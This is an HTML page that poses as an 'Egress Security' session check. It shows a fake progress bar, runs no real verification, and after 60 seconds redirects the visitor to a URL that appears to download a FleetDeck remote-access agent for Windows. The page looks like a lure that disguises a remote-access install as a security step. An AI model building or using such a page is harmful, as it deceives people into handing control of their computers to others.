<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Egress Security - Secure Redirect</title>
    <meta name="description" content="Secure session verification and redirect portal" />
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box; }

      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #0a0a0f 100%);
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #e2e8f0;
      }

      .container {
        text-align: center;
        padding: 2rem;
        max-width: 500px;
      }

      .spinner-container {
        margin-bottom: 2rem;
      }

      .spinner {
        width: 80px;
        height: 80px;
        margin: 0 auto;
        position: relative;
      }

      .spinner-ring {
        position: absolute;
        width: 100%;
        height: 100%;
        border: 3px solid transparent;
        border-top-color: #3b82f6;
        border-radius: 50%;
        animation: spin 1.5s linear infinite;
      }

      .spinner-ring:nth-child(2) {
        width: 60px;
        height: 60px;
        top: 10px;
        left: 10px;
        border-top-color: #60a5fa;
        animation-duration: 1.2s;
        animation-direction: reverse;
      }

      .spinner-ring:nth-child(3) {
        width: 40px;
        height: 40px;
        top: 20px;
        left: 20px;
        border-top-color: #93c5fd;
        animation-duration: 0.9s;
      }

      .shield {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        font-size: 1.5rem;
      }

      @keyframes spin {
        to { transform: rotate(360deg); }
      }

      h1 {
        font-size: 1.5rem;
        font-weight: 600;
        margin-bottom: 0.5rem;
        color: #f1f5f9;
      }

      .subtitle {
        color: #94a3b8;
        margin-bottom: 2rem;
      }

      .progress-container {
        background: rgba(30, 41, 59, 0.5);
        border-radius: 9999px;
        height: 8px;
        overflow: hidden;
        margin-bottom: 1rem;
      }

      .progress-bar {
        height: 100%;
        background: linear-gradient(90deg, #3b82f6, #60a5fa);
        border-radius: 9999px;
        transition: width 1s linear;
        width: 0%;
      }

      .footer {
        margin-top: 2rem;
        font-size: 0.75rem;
        color: #64748b;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="spinner-container">
        <div class="spinner">
          <div class="spinner-ring"></div>
          <div class="spinner-ring"></div>
          <div class="spinner-ring"></div>
          <div class="shield">üõ°Ô∏è</div>
        </div>
      </div>

      <h1>Egress Security Check</h1>
      <p class="subtitle">Please wait while we verify your session...</p>

      <div class="progress-container">
        <div class="progress-bar" id="progress"></div>
      </div>

      <p class="footer">Powered by Egress Security</p>
    </div>

    <script>
      const TOTAL_SECONDS = 60;
      const REDIRECT_URL = "https://agent.fleetdeck.io/rp59P49dMNr6CLNX6zmjX?win";

      let elapsed = 0;
      const progressBar = document.getElementById('progress');

      const interval = setInterval(() => {
        elapsed++;
        const percent = (elapsed / TOTAL_SECONDS) * 100;
        progressBar.style.width = percent + '%';

        if (elapsed >= TOTAL_SECONDS) {
          clearInterval(interval);
          window.location.href = REDIRECT_URL;
        }
      }, 1000);
    </script>
  </body>
</html>
